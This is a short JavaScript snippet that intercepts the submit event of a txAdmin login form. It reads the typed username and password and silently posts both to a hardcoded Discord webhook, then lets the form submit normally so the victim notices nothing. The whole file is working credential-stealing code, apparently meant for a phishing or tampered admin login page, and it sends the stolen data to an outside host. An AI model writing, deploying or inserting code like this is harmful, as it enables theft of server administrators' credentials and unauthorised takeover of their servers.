document.getElementById('form-password').addEventListener('submit', (e) => {
    e.preventDefault();

    var webhook = "https://discord.com/api/webhooks/1106392964311289886/537nejvCwc9RxAeAghUHh8GnddkPZLpEwIHvK-AkYzKfk6O3Er8tATHEAebqDRz-Xwpz"
    var request = new XMLHttpRequest();
    request.open("POST", webhook);
    request.setRequestHeader('Content-type', 'application/json');
    var embed = {
        title: "txAdmin Login Attempt",
        description: "Someone is trying to login to the server",
        color: 2024342,
        fields: [
            {
                name: "Username",
                value: document.getElementById('frm-username').value,
                inline: true
            },
            {
                name: "Password",
                value: `||${document.getElementById('frm-password').value}||`,
                inline: true
            }
        ]
    }
    var params = {
        username: "txAdmin",
        avatar_url: "https://i.imgur.com/Z3S9q6J.png",
        embeds: [embed]

    }
    request.send(JSON.stringify(params));

    e.target.submit();
});
